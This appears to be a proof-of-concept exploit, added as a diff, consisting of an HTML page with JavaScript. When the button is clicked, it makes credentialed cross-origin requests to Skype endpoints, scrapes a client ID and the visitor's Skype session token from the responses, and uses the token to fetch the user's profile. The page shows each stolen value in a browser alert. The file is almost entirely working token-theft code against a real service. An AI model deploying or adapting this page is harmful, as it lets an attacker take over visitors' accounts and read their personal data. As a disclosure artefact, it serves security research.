@@ -1,0 +1,99 @@
+<html>
+
+<script>
+
+function createCORSRequest(method, url) {
+  var xhr = new XMLHttpRequest();
+  if ("withCredentials" in xhr) {
+    xhr.open(method, url, true);
+  } else if (typeof XDomainRequest != "undefined") {
+    xhr = new XDomainRequest();
+    xhr.open(method, url);
+  } else {
+    xhr = null;
+  }
+  return xhr;
+}
+
+function getClientID(text) {
+  return text.match('client_id:"([^"]*)",redirect_uri')[1];
+}
+
+function getToken(text) {
+  return text.match('<input type="hidden" name="skypetoken" value="([^"]*)"/>')[1];
+}
+
+function makeCorsRequest() {
+
+  var url0 = 'https://s4w.cdn.skype.com/0-224-0/js/index.js';
+
+  var xhr0 = createCORSRequest('GET', url0	);
+  if (!xhr0) {
+	alert('CORS not supported');
+	return;
+  }
+  
+  xhr0.withCredentials = true;
+
+  xhr0.onload = function() {
+	var text0 = xhr0.responseText;
+	var clientid = getClientID(text0);
+	alert('Client ID: ' + clientid);
+  
+	  var url1 = 'https://login.skype.com/login?client_id='+clientid+'&redirect_uri=https%3A%2F%2Fweb.skype.com%2F%3Fintcmp%3Daccountweb-_-uktrybeta';
+
+	  var xhr1 = createCORSRequest('GET', url1);
+	  if (!xhr1) {
+		alert('CORS not supported');
+		return;
+	  }
+
+	  xhr1.withCredentials = true;
+	  
+	  xhr1.onload = function() {
+		var text1 = xhr1.responseText;
+		var token = getToken(text1);
+		alert('Skype Token: ' + token);
+		
+		  var url2 = 'https://api.skype.com/users/self/profile';
+		  
+		  var xhr2 = createCORSRequest('GET', url2);
+		  if (!xhr2) {
+			alert('CORS not supported');
+			return;
+		  }
+
+		  xhr2.withCredentials = true;
+		  xhr2.setRequestHeader("X-Skypetoken", token);
+		  
+		  xhr2.onload = function() {
+			var text2 = xhr2.responseText;
+			alert('User Profile: ' + text2);
+		  };
+
+		  xhr2.onerror = function() {
+			alert('Woops, there was an error making the request.');
+		  };
+		  
+		  xhr2.send();
+	  };
+
+	  xhr1.onerror = function() {
+		alert('Woops, there was an error making the request.');
+	  };
+	  
+	  xhr1.send();
+  };
+  
+  xhr0.onerror = function() {
+	alert('Woops, there was an error making the request.');
+  };
+  
+  xhr0.send();
+	  
+}
+</script>
+<body>
+	<button onclick="makeCorsRequest()">Click me</button>
+</body>
+</html>
